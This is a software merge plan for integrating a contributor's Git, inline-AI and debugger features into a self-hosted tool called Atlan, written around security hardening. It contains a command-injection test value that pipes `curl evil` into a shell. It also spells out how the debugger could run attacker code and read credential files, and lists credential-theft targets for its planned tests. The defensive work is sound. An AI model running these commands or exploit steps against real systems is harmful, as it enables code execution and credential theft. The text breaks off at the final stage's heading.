# MERGE-PLAN-helis.md — Integration Run-Sheet for helis-d's `feature/inline-ai-git-ui-debugger`

**Status:** executable plan · not yet started · work happens on an isolated integration worktree, nothing reaches `main` until John names a push state
**Contribution:** remote `helis` → `https://github.com/helis-d/atlan.git`, branch `feature/inline-ai-git-ui-debugger` (+1001 / −94, 10 files: 3 net-new server modules + colliding frontend)
**Reviewed against:** `main` @ `80f0e0f` (the review baseline). **Live `main` tip is now `aa05695`** — main has moved since the review; **rebase the integration branch on the live tip, re-verify the six preserved surfaces still exist, and re-run the pre-merge baseline gate before trusting any line-number anchor below.**
**Source of record:** `docs/CONTRIB-REVIEW-helis.md` (§5 seams, §6 order, §7 decisions); raw diffs + his modules + our colliding files in the scratchpad `helis-review/` dir.

---

## 1. Overview

### 1.1 What this plan does
Lands helis-d's four change-kinds — the Tier-2 **Inline AI** editor pipe, the **Git Manager**, the **Visual Debugger**, and his **UI skin** — onto Atlan's hardened spine, each placed at its correct tier in the gating gradient, **without** regressing our hardening (the `SENSITIVE`/`guardPath`/`blockAppRoot` guards, the XSS-safe `renderRichMessage`/`buildCodeBlock`/`sendToEditor` pseudo-assistant, `execFile`+`--`, and the six newer surfaces his branch predates). The debugger is the one CRITICAL surface and is quarantined to a single decision-gated stage that defaults to **park**.

### 1.2 Branch & isolation strategy
- **This checkout is the live node.** `//wsl.localhost/Ubuntu/root/atlan` is what `atlan.service` (systemd + keep-alive) serves on `:4589`. `git switch` here swaps `server/src/*` **under the running service**, and a keep-alive/systemd restart would boot the integration branch into production.
- **Therefore: work in a separate `git worktree`, not a branch-switch in the live checkout.** `git worktree add /root/atlan-integration integration/helis-inline-ai-git-ui` off the live `main` tip. The live checkout stays on `main`; the service is undisturbed. The test gate is already port-isolated (ephemeral port, temp state), so it runs fine from the worktree.
- **Whole-branch abort** = `git worktree remove --force /root/atlan-integration && git branch -D integration/helis-inline-ai-git-ui`. Live `main` never moved; nothing to unwind.
- **Every commit ends on a green `npm test`.** Where a stage touches a guard, it adds a new assertion to `test/security.mjs` so the fix is gate-enforced, not eyeballed.

### 1.3 Golden rules (do not break)
1. **Never `git merge helis/...`.** His `app.js +297` and `index.html +83` land in files our hardening rewrote. Those two are **3-way surgical merges — never take-his**. Everything else is a file-add or a scoped patch.
2. **Preserve our six newer surfaces** his branch predates, verified present after every merge touch: Persona+ builder (`cPersona`/`pProfile`), worker Hierarchy (`hEngine`/`jobGate`), Routines (`routKind`), the Scan card (nested in Doctor), the `templateSel` options + `data-template` boot seed, and the local-model picker (`lmSel`).
3. **Keep exactly one spine renderer.** Retain `renderRichMessage` (XSS-safe + → Editor bridge), `buildCodeBlock`, `sendToEditor`; **drop** his `formatMarkdown` `addMsg`/`endWorking` edits; **do not** redeclare `escapeHtml`.
4. **The sole Atlan gate is `npm test`.** There is **no** `format`/`lint`/`build`/`self-audit` script in this repo (root `package.json` exposes only `dev`/`web`/`test`/`sync:preflight`). Do **not** run or assume `prettier`/`format:check` here — that is the PreFlight convention, not Atlan's.
5. **Nothing to `main`, no push, no fast-forward, until John explicitly names a push state.** Rebase-not-force if `main` moved. Never `--force`.

### 1.4 Two claims struck from the earlier draft run-sheet (adversary-corrected)
- **"Each stage is one independently revertible commit" is false** for `index.js` and `index.html` — multiple stages edit them on adjacent lines, so a mid-stack `git revert` conflicts. File-**add** stages revert cleanly; shared-wiring stages are **fixed forward**, not reverted, once later commits sit on top. (See §6.)
- **"Ship the debugger behind a client-side confirm" is not a control.** In the RCE threat model the client is the adversary; the `debug.start` gate must be **server-side**, and that plumbing does not exist in this merge — which is why **park is the only safe default** for D1. (See §3 S11 and §4-A.)

---

## 2. Decisions-first — John's 9-answer checklist

Reply **"all defaults"** and execution is deterministic: the plan runs the decision-independent stages (W0→S7, then S12/S13) and applies every default to the gated stages (S8–S11), with the debugger **parked**. Or override any single line below.

| # | Question | **Recommended default** | One-line why | Overriding adds prerequisite work? |
|---|---|---|---|---|
| **D1** | Debugger: ship (mitigated) or park? | **PARK** | The only control that makes "ship" safe — a **server-side** `debug.start` gate — is unbuilt plumbing; the §5-A mitigation spec is written, so ship-later is cheap. | **Yes → ship requires building + testing a server-side `debug.start` permission card BEFORE S11 can land** (critical-path change). |
| **D2** | Git panel on the cockpit's own repo (`APP_ROOT`)? | **HARD-BLOCK** | Matches the editor's posture; is also the mandatory §5-C security floor, so it costs nothing. | No — default = the floor. Override adds a separately-gated self-repo mode. |
| **D3** | `gitAiCommitMsg` diff egress? | **OPT-IN + SECRET-SCAN + per-invocation CONFIRM** | Serves "don't propagate secrets off the box"; each egress becomes a conscious, itemized act. | No — one-line flip to warn-only. |
| **D4** | Git/Debug under all three skins? | **ALL THREE (shared spine/nav)** | They're cockpit features, not a look; a skin must never add/remove functional DOM. | Override → a **non-skin** body/nav feature-flag (extra branching). |
| **D5** | Classic gets a light mode? | **PER-TEMPLATE** (`[data-template="his"][data-theme="light"]`; Classic dark-only) | Keeps Classic byte-for-byte; global light is a separate design pass. | Override → design + review a Classic light variant. |
| **D6** | `#themeBtn` + swipe-nav on all skins? | **SPINE, theme-button auto-graceful** (inert where the active skin defines no light block) | Global behaviors belong on the one spine. | No — default handles the dark-only case. |
| **D7** | Tier-3 editor-write gate? | **DOCUMENT manual Save as the gate** (tier-marker flagged as a fast-follow) | The write can't escape `guardPath`; a tier-tagged confirm is a refinement, not a gap. | Override → thread a tier field through `chat.send`/`ai-edit` + a Tier-3 confirm UI. |
| **D8** | Nav real-estate (7 → 9 buttons on a phone)? | **NEST** (Scan-in-Doctor pattern) | Phone-first is a hard constraint; ships now, no nav redesign. | **Yes → redesign blocks S8/S11 on a new bottom-nav design pass** (not morning-executable). |
| **D9** | Attribution? | **NOTICE line + `Co-Authored-By` trailer + `#templateSel` label** | Cheap, honest; the template label is the natural credit surface. | No — pure naming. **One input needed: the display-name string for the label + NOTICE.** |

**Only two overrides change the critical path:** D1→ship (build the server-side `debug.start` gate first) and D8→redesign (new nav design first). Every other override is a local swap inside an already-scheduled stage.

**Key couplings to surface for John:**
- **D1 ↔ D8:** park Debug (D1 default) → only Git needs a nav home → 8 buttons, nesting (D8 default) is trivial. Shipping Debug tightens the nav case.
- **D5 ↔ D6:** dark-only Classic (D5 default) means `#themeBtn` must degrade gracefully (D6 default handles it). Global light (D5) makes the theme button meaningful everywhere.
- **D2 is "default = free":** the security floor already implements hard-block, so D2=hard-block costs nothing; only the deviation adds work.

### 2.1 Decision-independent vs decision-gated split

**DECISION-INDEPENDENT — safe to start now, in order, no §7 answer required:**
`W0` worktree → `S0` branch → `S1` guard FOUNDATION → `S2` `s-scan` TAB_NAMES fix → `S3` `pty.js` KEEP → `S4` `resolveBrain()` in `brains.js` → `S5` `editorAi.js` + route → `S6` `git.js` + security patches + routes → `S7` `his.css` BASE + option + link. Plus `S12` (gate) and `S13` (hand-off) always run.

These constitute a **complete, shippable integration** of the guard fix, PTY hardening, the Tier-2 inline-AI pipe, the hardened Git Manager, and the "His" skin — with **zero** dependency on any §7 answer. The defaults then bolt on cleanly.

**DECISION-GATED — needs a John answer (defaults let planning proceed):**
`S8` index.html non-debug subtrees `[D4/D6/D8]` · `S9` app.js surgical `[D3/D6/D7]` · `S10` his.css light-block `[D5]` · `S11` debugger `[D1 — can drop the whole stage; D8 nav]`.

---

## 3. Staged run-sheet

Each stage: **preconditions · exact changes · verify · rollback · gating-decision.** Stage IDs are stable; the ordering folds the sequencing adversary's F1–F9 and the completeness critique's A1–A3, B–D.

> **Revert-scope reality (F2):** file-**add** stages (`S1` config half, `S3`, `S4`, `S5` module, `S6` module, `S7`) revert cleanly. **Shared-wiring** stages (`S5`/`S6` routes in `index.js`, `S8` index.html, `S9` app.js, `S11` index.js WS) edit shared files on adjacent lines and are **fixed forward** once later commits land on top — do not expect a clean isolated revert. Keep each module's `index.js` import/route inside its own commented region (`// ── git ──`, `// ── editor inline AI ──`) to minimize adjacency conflicts.

---

### W0 · Worktree isolation (NEW — completeness A1)
- **Preconditions:** clean live checkout on `main`; `git fetch helis` done; live `atlan.service` healthy on `:4589`.
- **Changes:** `git -C /root/atlan fetch origin && git -C /root/atlan worktree add /root/atlan-integration -b integration/helis-inline-ai-git-ui origin/main`. All subsequent work happens in `/root/atlan-integration`. Optionally `git branch helis-src helis/feature/inline-ai-git-ui-debugger` for cherry-reference of subtrees (**never a merge base**).
- **Verify:** live `/root/atlan` still on `main` (`git -C /root/atlan rev-parse --abbrev-ref HEAD`); service still serving `:4589`; in the worktree `npm test` is **green** (establish the pre-merge baseline — if red now, stop and fix baseline first).
- **Rollback / whole-branch abort:** `git -C /root/atlan worktree remove --force /root/atlan-integration && git -C /root/atlan branch -D integration/helis-inline-ai-git-ui`. Live `main` untouched.
- **Gate:** none.

### S0 · Establish the integration baseline
- **Preconditions:** W0.
- **Changes:** none (checkpoint). Confirm the worktree tip equals the live `main` tip (currently `aa05695`, not the review's `80f0e0f`).
- **Verify:** `git log -1` = live `main`; `git status` clean; baseline `npm test` green.
- **Rollback:** see W0 abort.
- **Gate:** none.

### S1 · Guard FOUNDATION — `SENSITIVE` separator-agnostic + win32 `PROJECTS_DIR` (§5-E)
- **Preconditions:** S0.
- **Changes (ONE commit, two files):**
  - `server/src/guards.js` — normalize a **copy** for the two `SENSITIVE.test` calls (do **not** mutate the returned path, do **not** edit the source-of-truth regex). At line ~44 `SENSITIVE.test(abs)` → `SENSITIVE.test(abs.replace(/\\/g,'/'))`; at line ~55 `SENSITIVE.test(real)` → `SENSITIVE.test(real.replace(/\\/g,'/'))`.
  - `server/src/config.js` — adopt his win32 default: `PROJECTS_DIR = ... process.platform === 'win32' ? process.cwd() : '/root'`. **Same commit** so the guard can never diverge from the projects-root by platform.
- **Verify:** re-run the scratchpad `re_test.mjs` — all three cases (`/root/.claude/x`, `C:\Users\...\.claude\x`, `C:\...\.config\gh\x`) print `true` (the two backslash cases print `false` today). Add a pinned `test/security.mjs` unit block asserting both separators throw and a normal project path (`/root/projects/app/index.js`, `C:\Users\jviru\projects\app\index.js`) returns. `npm test` green (Linux path unchanged → prod home node is a no-op).
- **Rollback:** **FOUNDATION — fix forward, never revert (F6).** After any `guardPath` consumer (S5/S6/S11) lands, reverting S1 silently re-opens the win32 fail-open on those surfaces. The pinned security.mjs assertion trips the gate if it's ever accidentally reverted.
- **Gate:** none (mandatory hardening).

### S2 · `s-scan` self-awareness fix (tiny, decision-independent — F4)
- **Preconditions:** S0.
- **Changes:** `server/src/index.js` `TAB_NAMES` (line ~325) — add `'s-scan': 'Scan'`. This fixes a **live bug**: the Scan surface exists but is unregistered, so `cockpitContext` currently misreports it as "Chat" (`TAB_NAMES[tab] || 'Chat'`). `s-git`/`s-debug` are **not** added here — they land atomically with their surfaces (S8/S11).
- **Verify:** `cockpitContext('s-scan', …)` → `tab: Scan`. `npm test` green.
- **Rollback:** `git revert` (pure map addition).
- **Gate:** none.

### S3 · `pty.js` KEEP (take-his superset, with a 3-way hardening diff — F8)
- **Preconditions:** S1.
- **Changes:** replace `server/src/pty.js` `openPty` with his (graceful spawn try/catch reporting `[PTY Spawn Error …]` to the ws + `return null`; win32 `COMSPEC`/`powershell.exe` shell + cwd defaulting). **Copy fix:** the win32 branch has no tmux, but the `pty.exit` copy says "tmux session ended" — make it generic ("terminal session ended"). Cosmetic, dead on the Linux prod node.
- **Verify (F8 — do NOT take-his on trust):** `git diff` our `openPty` vs his and **prove no hardening of ours is dropped** before replacing; confirm `ptyEnv()` (lines ~7-13) is byte-identical and his hunk does not touch it. On Linux the spawned process is still `tmux new-session -A -s atlan-<name>`. `test/connection.mjs` (PTY round-trip) green; force a spawn failure (rename `tmux` on a throwaway) → ws receives the spawn-error frame, not an unhandled throw.
- **Rollback:** `git revert` (restores our `openPty`; no importer changed).
- **Gate:** none.

### S4 · `resolveBrain()` in `brains.js` (NEW — removes the forward-reference/drift, F3)
- **Preconditions:** S1. `engineRoster`/`brainChat` present (they are).
- **Changes:** add **one** shared resolver to `server/src/brains.js` — the single source of truth for both `editorAi` and `gitAiCommitMsg` (prevents two drifting copies of the brain-mapping, the same anti-drift ethos `guards.js` documents):
  ```js
  // Map a UI engine selection to a real chat brain. Agents (claude/codex/copilot)
  // and any non-PROVIDERS id are NOT brains → fall back to the first ready brain.
  export async function resolveBrain(engine, model, roster) {
    roster = roster || await engineRoster();
    const hit = engine ? roster.find(r => r.id === engine) : null; // roster ids ARE PROVIDERS ids
    if (hit) return { provider: hit.id, model: model || hit.model, chosen: hit.label, fellBack: false };
    const ready = roster.find(r => r.ready);
    if (!ready) throw new Error('No configured brain key found. Add a brain key (Gemini, OpenAI, …) in Doctor.');
    return { provider: ready.id, model: ready.model, chosen: ready.label, fellBack: true };
  }
  ```
- **Verify:** unit-test the classifier: a real `PROVIDERS` id resolves to itself; an agent id (`claude`/`codex`/`copilot`) and any unknown id fall back to the first-ready brain; the `grok`/`gemini` agent-vs-brain ambiguity (§4.3) resolves brain-first; no-key throws the "Add a brain key" error. `npm test` green.
- **Rollback:** `git revert` (pure add, no consumers yet).
- **Gate:** none.

### S5 · ADAPT `editorAi.js` (the Tier-2 pipe) + route + dispatcher (§2 ADAPT, §4.3/4.4)
- **Preconditions:** S1, S4.
- **Changes (ONE commit):**
  - Add `server/src/editorAi.js` from his source. **Keep** `guardPath(path, { blockAppRoot: true })` (his line 15 — already correct; it never writes disk, the client applies to the CM buffer, Save goes through the guarded `/api/file`).
  - **Engine selection:** replace his blind `roster.find(r=>r.ready)` with `resolveBrain(engine, model, roster)` (imported from S4). Read `engine`/`model` from `req.body`. Surface which brain ran (`{ ok, content, engine: chosen }`). This fixes the silent no-op where `#modelSel` emits `claude` (an agent, not a `PROVIDERS` brain) → `brainChat` returns `chat.err "unknown engine: claude"`.
  - **Empty-reply data-loss guard (§4.4 latent):** on a `chat.err` his `mockSend` never fires and `reply` stays `''`; the client's no-selection path would then `cmEditor.setValue('')` and wipe the file. After `brainChat`, if `errMsg` set → throw it; if the cleaned reply is empty → `throw new Error('model returned no content — edit not applied')`. **Never return an empty buffer.**
  - Wire the route in `index.js`: `import { handleInlineAiEdit } from './editorAi.js';` + `app.post('/api/editor/ai-edit', handleInlineAiEdit);` inside its own `// ── editor inline AI ──` region, **after** `app.use('/api', authMiddleware)` (post-auth + origin-pin → inherits password/cookie/bearer + CSRF).
- **Verify:** `npm test` green. New `test/security.mjs` cases: POST `/api/editor/ai-edit` with `path` = `/root/.claude/.credentials.json` → **400** (`blockAppRoot`+`SENSITIVE` refuse before any brain call). Functional (against `test/mock-engine.mjs`): `engine=claude` (agent) maps to a ready brain, returns edited content, does **not** error "unknown engine". **Data-loss guard:** stub `brainChat` to emit only `chat.err` → endpoint 400, assert `cmEditor.getValue()` unchanged (buffer never wiped). **Mini adversarial pass on `/api/editor/ai-edit` now (F7)** — not deferred to S12.
- **Rollback:** `git revert` (removes file + route + import; frontend not yet wired).
- **Gate:** none for the backend (default engine-mapping is safe). The Tier-3 **extra confirm** (§4.5 / D7) is a frontend concern deferred to S9; default = document-only.

### S6 · ADAPT `git.js` + security patches (§5-B/-C/-D) + routes
- **Preconditions:** S1, S4. **Gated by D2 (scope) and D3 (egress) — defaults below let it proceed as the security floor.**
- **Changes (ONE commit):** add `server/src/git.js`, then patch **before** mounting routes. Put shared secret constants/regexes in a new `server/src/secrets.js` (imported by git.js and, if shipped, debugger.js — one source of truth, mirroring `guards.js`).
  - **§5-C `blockAppRoot` on all 8 sites** — `status`, `diff`, `stage`, `unstage`, `commit`, `push`, `pull`, `ai-commit-msg`: add `{ blockAppRoot: true }` to every `guardPath`. *(D2 default = block; = the floor. If John later allows deliberate self-repo ops, gate that behind an explicit flag, never by dropping `blockAppRoot`.)*
  - **§5-B `getGitDiff` guarded read** — one up-front per-file guard covers all three vectors (untracked `fs` fallback, in-repo symlink, tracked-sensitive diff): `const absFile = guardPath(join(cwd, file), { blockAppRoot: true, mustExist: false });` **before** any `git show`/`readFileSync`/`git diff HEAD -- file`. Read only `absFile` (or, conservative default, render `+ (untracked file — not shown; open it in the editor)`). Add `import { join } from 'node:path';`.
  - **§5-D egress scan (`gitAiCommitMsg`)** — before `brainChat`: scan the staged file list against `SENSITIVE` and the diff body against `scanForSecrets()` (in `secrets.js`). **D3 default:** if hits and no `confirm:true` → `return res.json({ needsConfirm:true, findings:{paths, kinds}, note })` with **zero** outbound brain call. *(D3 override to warn-only = drop the early return, add `warned:` to the response.)*
  - **§5-G preserve exactly:** `runGit = execFile('git', argv, {cwd})` (no shell), `--` end-of-options on every pathspec, push/pull take **no** user args. **Never switch to `exec`/`shell:true`; never drop `--`.**
  - Also refactor `gitAiCommitMsg`'s brittle `engine==='claude'` ladder onto `resolveBrain()` (S4) — closes the same `codex`/`copilot` → "unknown engine" gap in one stroke.
  - Wire the 8 handlers in `index.js` inside a `// ── git ──` region, post-auth: `GET /api/git/status|diff`, `POST /api/git/stage|unstage|commit|push|pull|ai-commit-msg`.
- **Verify:** `npm test` green. New `test/security.mjs` cases in a scratch repo under `PROJECTS_DIR`: (a) untracked `id_rsa` → `GET /api/git/diff?...&file=id_rsa` → **400**, key bytes never in body; (b) in-repo symlink `notes -> /root/.claude/.credentials.json` (untracked) → **400**; (c) tracked-modified `.env` → **400**; (d) `?path=<APP_ROOT>` on any handler → **400** (`blockAppRoot`); (e) `ai-commit-msg` with a staged `.env`/`OPENAI_API_KEY=sk-…` and no `confirm` → `needsConfirm` listing the finding, and assert **zero** `brainChat` calls (spy the mock); with `confirm:true` → proceeds; (f) command-injection commit `-m "; curl evil | sh"` proves inert (argv stays literal). **Mini adversarial pass on `/api/git/*` now (F7).**
- **Rollback:** `git revert` removes module + routes + imports (frontend not yet wired).
- **Gate:** D2 (default block = free), D3 (default scan+confirm). Both defaults are the safe branch.

### S7 · `his.css` BASE + `<option value="his">` + `<link>` — ONE atomic commit (F5, decision-independent)
- **Preconditions:** S0. Decision-independent — only the **light block** is gated (deferred to S10).
- **Changes (ONE commit, so the skin selector never points at a missing file):**
  - Create `web/public/his.css` mirroring `midatlantic.css`'s pattern: move **every** glass var + `backdrop-filter` rule + animation from his `style.css` diff, each **re-scoped** from a bare selector to `:root[data-template="his"]` / `[data-template="his"] <sel>`. His diff as-written rewrites shared base rules (`body`, `.phone`, `header`, `nav`, `.msg.claude`, `.btn`) **un-scoped** — that is the direct "overwriting John's" violation; re-scoping is the fix. **Do NOT** add debug-specific styles here (they land in S11 — F9).
  - Add `<option value="his">His</option>` to `#templateSel` (mirroring `midatlantic`).
  - Add `<link rel="stylesheet" href="his.css?v=<token>">` in `<head>` **after** `style.css` (its scoped selectors out-specify the base). **Leave `web/public/style.css` byte-for-byte — do NOT take his `style.css?v` bump** (his `diff_indexhtml.txt` bumps `style.css?v=20260724b`; that hunk is rejected because we don't touch `style.css`).
- **Verify (§3.2 invariant):** with `data-template` unset, computed `body`/`header`/`.btn`/`nav`/`.msg.claude` styles are **byte-identical to pre-merge Classic** (diff the rendered CSSOM or spot-check the six selectors). Switch `#templateSel` to His → glass/animation apply; back to Classic → fully reverts; MidAtlantic still composes. UI specs green.
- **Rollback:** `git revert` (deletes `his.css`; harmless).
- **Gate:** none for the base. Light palette is S10 (D5).

---
**↑ Everything above is DECISION-INDEPENDENT — safe to run while John sleeps. ↓ Everything below is DECISION-GATED.**
---

### S8 · `index.html` — surgical 3-way merge (non-debug spine + His skin) [D4/D6/D8]
- **Preconditions:** S5, S6 (routes exist so DOM hooks resolve), S7 (skin link present).
- **Changes (ONE commit) — cherry-pick ONLY his new node subtrees; preserve our six surfaces:**
  - ADD to header: `<button id="themeBtn">☀️</button>` (D6 default: spine, all skins).
  - ADD to `s-editor` snapbar: `<button class="btn hot" id="edInlineAi">✨ Inline AI</button>` + the `#aiModal` subtree.
  - ADD the whole `#s-git` `<section>`.
  - **Register `s-git` in `TAB_NAMES`** in this commit (F4 — map + surface land/revert atomically).
  - **Nav (D8 default = NEST):** do **not** add top-level Git/Debug buttons (his diff adds two → 9 buttons, overflows a narrow phone). Surface Git via a sub-entry (Editor toolbar or a Doctor-style nested control); keep the 7-button bottom nav. *(D4 branch: if Classic must hide Git, feature-flag by a nav/body class — never by the skin value.)*
  - **DO NOT add** his `s-debug` section or Debug nav here — deferred to S11.
  - **Cache-bust (C3):** bump `app.js?v=<token>` (it changes in S9). **No `sw.js` edit** — `sw.js` is hard-rule fetch-free; the only cache-bust mechanism is the `?v=` query string.
  - **MUST-PRESERVE (verify each still present after merge):** Persona+ (`cPersona`/`pProfile`), Hierarchy (`hEngine`/`jobGate`), Routines (`routKind`), the Scan card, `templateSel` options + `data-template` seed, `lmSel`.
- **Verify:** `git diff main -- web/public/index.html` shows **only** additions — **zero** deletions touching the six surfaces. Page loads: all nav tabs render; six surfaces present; `templateSel` lists Classic/MidAtlantic/His. UI/tour specs green.
- **Rollback:** fix forward (F2) — revert with or before S9 (handlers would bind to missing nodes; S9 handlers must `if(!el)return`-guard regardless).
- **Gate:** D4, D6, D8.

### S9 · `app.js` — surgical merge (non-debug), preserve our renderer [D3/D6/D7]
- **Preconditions:** S8 (DOM hooks exist).
- **Changes (ONE commit) — ADD his behavior, DROP his renderer edits:**
  - **ADD:** the theme block (`applyTheme`/`themeBtn`/`localStorage 'theme'`), the swipe-nav block, the Inline-AI handlers (`#edInlineAi`, `#aiModal` submit → `POST /api/editor/ai-edit`, sending `engine`/`model` from `$('modelSel').value.split('|')`), and the Git handlers (`gitRefresh`, `gitColorDiff`, stage/unstage/commit/push/pull, `gitAiMsgBtn`).
  - **Wire the tab-init dispatcher (completeness A2 — his contribution never calls `initGit`):** in the `tabs.forEach` block at `app.js:64-67`, add `if (b.dataset.s === 's-git') initGit();`. Without this the Git list never auto-populates.
  - **D3 egress UI:** on `ai-commit-msg` `needsConfirm`, render the suspect paths/kinds and require a deliberate `confirm()` before re-POST with `confirm:true` — "shows what leaves the box."
  - **§4.4 no-selection footgun (must-add):** his `aiModalSubmit` does `cmEditor.setValue(j.content)` over the live buffer keeping `edCurrentPath` — a reflexive Save overwrites the real file with no diff/undo. Patch: wrap in a single CM transaction (`cmEditor.operation(...)`) for one-undo, **and** gate the whole-file path behind `confirm('Replace the entire file with AI output? Current unsaved edits will be lost.')`. (Selection path `replaceSelection` is fine — leave it.)
  - **DROP (hard collisions):** his `formatMarkdown`; his `addMsg` change `div.append(formatMarkdown(text))` — **keep our** `if (role==='brain') renderRichMessage(...)` branch; his `endWorking` re-render — no counterpart, drop it. **Do NOT redeclare `escapeHtml`** — his git render depends on our single definition (`app.js:442`).
  - **Keep our WS `switch` untouched** — git/editor are REST; theme/swipe/inline-AI are DOM; **no `debug.event` case here** (deferred to S11).
  - **D7 default:** in-code comment at the inline-AI + `sendToEditor` boundary documenting that the manual Save is the Tier-3 editor gate; no extra confirm now.
  - **Non-issue, do not waste a cycle (C2):** editor identifiers (`edCurrentPath`/`edClean`/`edDirty`) already match ours — no rename reconcile needed.
- **Verify:** `npm test` green. Manual matrix: (1) a brain chat reply still renders code cards with **→ Editor** (`renderRichMessage`/`buildCodeBlock` intact); (2) inline-AI on a selection replaces in place; (3) no-selection now prompts a confirm and is a single undo; (4) `✨ AI Message` with `#modelSel`=an agent still fills a commit message (resolveBrain); (5) theme toggle + swipe work; (6) egress confirm appears with a staged secret. Grep merged `app.js`: `formatMarkdown` → **zero** hits; `function escapeHtml` → **exactly one**.
- **Rollback:** fix forward (F2); revert with S8 to back the UI out fully.
- **Gate:** D3, D6, D7.

### S10 · `his.css` light-palette block only [D5]
- **Preconditions:** S7, S9 (`applyTheme` on the spine). **Gated by D5.**
- **Changes:** move his light palette to `[data-template="his"][data-theme="light"]`. `#themeBtn`/`applyTheme` stay on the spine as the global `data-theme` axis (S9); Classic stays dark-only. *(D5 override = a top-level `:root[data-theme="light"]` block instead — but that changes Classic, so it's John's call.)* Ensure `#themeBtn` degrades gracefully under a dark-only skin (D6).
- **Verify:** His skin toggles light/dark; Classic + MidAtlantic keep their single look; base unchanged with `data-template` unset. UI specs green.
- **Rollback:** `git revert` (removes only the light block).
- **Gate:** D5.

### S11 · Debugger — HOLD, quarantined, **default PARK** [D1 — can drop the whole stage; D8 nav]
- **Preconditions:** S1–S10 green. **HARD-GATED by D1.**
- **D1 default = PARK:** skip this stage. `debugger.js` stays in-tree as a spec-annotated TODO (the §4-A patch spec is written); the merge is complete at S9/S10. **The merge is fully shippable without this stage.**
- **D1 = ship → BLOCKED on new plumbing (F1, critical):** the CDP allowlist does **not** close the debugger's RCE. `debug.start` spawns `node --inspect-brk <scriptPath>` where **`scriptPath`/`cwd` are client-supplied**, and any Tier-2 caller can first write `evil.js` under `PROJECTS_DIR` via `/api/file`; a single **allowlisted** `Debugger.resume` then runs `evil.js`'s body (full `fs`+network as root) — reading `.auth-token`/`.claude`/`.fleet` with no denied CDP method ever seen. A client-side confirm is **not a control** (the client is the adversary). Therefore **`debug.start` must be gated by a SERVER-SIDE human approval before spawn**, reusing the existing `perm.req`/`perm.reply` (or `hierarchy.js resolveGate`) path — **that plumbing does not exist in this merge and must be built + tested before S11 can land.** If John chooses ship, land everything below plus the server-side gate as **one commit** so a single `git revert` removes the entire debugger.
- **Changes (all-or-nothing, ship branch only):** add `server/src/debugger.js`, then all §5-A mitigations (spec in §4-A): server-side **default-deny CDP allowlist** (deny `Runtime.evaluate`/`callFunctionOn`/`compileScript`/`addBinding`, `Debugger.setScriptSource`/`evaluateOnCallFrame`, and **any `condition`-bearing breakpoint**); **minimal-env spawn** (`scrubbedEnv()` dropping `ATLAN_TOKEN` + provider keys); `blockAppRoot:true` on both `guardPath` calls; **server-side `debug.start` permission card**; concurrent-session cap. Wire `index.js` WS `debug.start`/`debug.cmd`/**`debug.stop`** (his client sends `debug.stop` but no case exists — add it → `cleanupSession`), server-side `clientId`, `ws.on('close')` cleanup. Add his `#s-debug` section + a **nested** Debug nav (D8), `s-debug` in `TAB_NAMES`, and app.js debug handlers **including `if (b.dataset.s === 's-debug') initDebugger();` in the dispatcher (A2 — else `dbgEditor` stays null and the pane is dead).** **Source-fetch fix (A3):** strip the `file://` scheme and decode `frame.url` before the `/api/file` fetch, else legitimate frames 400 too — only then does "source unavailable" apply to genuinely out-of-root frames. **Debug CSS lands in this commit (F9)** — append `.debug-active-line`/`.debug-var` to `his.css` here so the revert is truly atomic. **Cosmetic (C1):** `initDebugger` sets `CodeMirror.modeURL` but never calls `autoLoadMode` and no `loadmode.js` is vendored → drop the dead line or vendor `loadmode.js`.
- **Verify (ship branch):** `npm test` green. New `test/security.mjs` (authed WS): `Runtime.evaluate` reading `/root/.auth-token` → denied, no bytes in any `debug.event`, audit line logged; `Debugger.evaluateOnCallFrame` → denied; a `condition`-bearing `setBreakpoint` → denied; **`debug.start {scriptPath:'evil.js'}` written via `/api/file` then `Debugger.resume` → blocked by the server-side START gate (the F1 primary path)**; env-scrub → child sees `ATLAN_TOKEN`/keys as empty, `PATH` non-empty; `debug.start` with `cwd`/`scriptPath` in `APP_ROOT` → refused; N+1 sessions → capped. Functional: step + `Runtime.getProperties` round-trips (verify getters can't fire arbitrary JS on paused scope objects). Extend `adversarial.mjs` against `debug.*`.
- **Rollback:** `git revert` removes the entire debugger (backend, WS, frontend, nav, `s-debug` TAB_NAMES, debug CSS) atomically. Nothing else depends on it.
- **Gate:** D1 (park drops the whole stage; ship requires the server-side gate first), D8 (nav).

### S12 · Full local gate + adversarial contextless pass + PreFlight dogfood
- **Preconditions:** all landed stages committed. Decision-independent (runs whatever the final stage set is).
- **Changes:** register any new test files (`test/git.mjs`, `test/editorAi.mjs`, and `test/debugger.mjs` if shipped) in `run-all.mjs`'s SUITES array so the coverage lands in the receipt (B2). Otherwise verification only.
- **Verify:**
  - **`npm test`** → `bash test/run.sh` boots a throwaway server on an **isolated ephemeral port** (not a fixed `:4599` — B4) with temp state and runs `run-all.mjs` (unit, function, connection, **security**, **adversarial**, hierarchy, attachments, editor, voice, ui.spec, tour.spec) — **all green**, including every assertion added in S1/S5/S6/S11. Brain-dependent tests use `test/mock-engine.mjs` (no live key, no spend). If the throwaway boot is unhealthy the runner **aborts without writing RECEIPTS** — treat that as a red gate.
  - **The sole gate is `npm test` (B1).** Do **not** run `prettier`/`format:check`/`build`/`self-audit` — no such script exists in this repo.
  - **Adversarial contextless pass** (standing convention): independent, context-starved agents pointed at the merged `/api/git/*`, `/api/editor/ai-edit`, and (if shipped) `debug.*`, tasked to exfiltrate `/root/.claude/.credentials.json`, `.auth-token`, `.fleet/auth.json`, or write into `APP_ROOT`. Every attempt refused. Self-authored tests passing is **not** sufficient (AI-authored tests share blind spots).
  - **PreFlight dogfood pass, distinct from the adversarial pass (B3):** run the cockpit's own **Scan** surface / the vendored PreFlight engine (`server/src/preflight/engine/`, `loadScan()`) against the three new modules (debugger `spawn`, git diff-egress + child env, inline-AI fetch). Per house rule, **any finding — even INFO — is fixed for real, never suppressed.**
  - **Regression sanity:** brain code cards still show → Editor; six preserved surfaces intact; three skins switch cleanly; Classic byte-for-byte.
- **Rollback:** on any red gate, revert the offending file-add stage (or fix forward on a shared-wiring stage) and re-run — do not patch forward on a red gate for isolated adds.
- **Gate:** none (this is the gate).

### S13 · Hand to John (attribution, receipts, push state) [D9]
- **Preconditions:** S12 fully green.
- **Changes:**
